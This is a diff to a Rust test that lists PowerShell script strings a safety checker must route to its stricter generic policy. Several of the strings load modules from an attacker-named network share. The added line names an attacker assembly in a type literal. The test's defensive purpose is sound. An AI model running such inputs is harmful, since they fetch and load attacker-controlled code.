@@ -212,6 +212,7 @@ async fn trusted_unsupported_scripts_use_the_generic_outer_policy() {
         "#Requires -Modules C:\\workspace\\CodexProbe.psm1\nGet-Content Cargo.toml",
         "UsInG MoDuLe '\\\\attacker\\share\\Evil.psd1'\nGet-Content Cargo.toml",
         "configuration CodexProbe { Import-DscResource -ModuleName '\\\\attacker\\share\\Evil.psd1' }",
+        "[Codex.DoesNotExist, C:/workspace/Codex.AttackerAssembly]",
         // The raw pre-parser gate intentionally accepts false positives in exchange for
         // never invoking SMA on a possible parse-time construct.
         "Write-Output 'confusing but inert'",
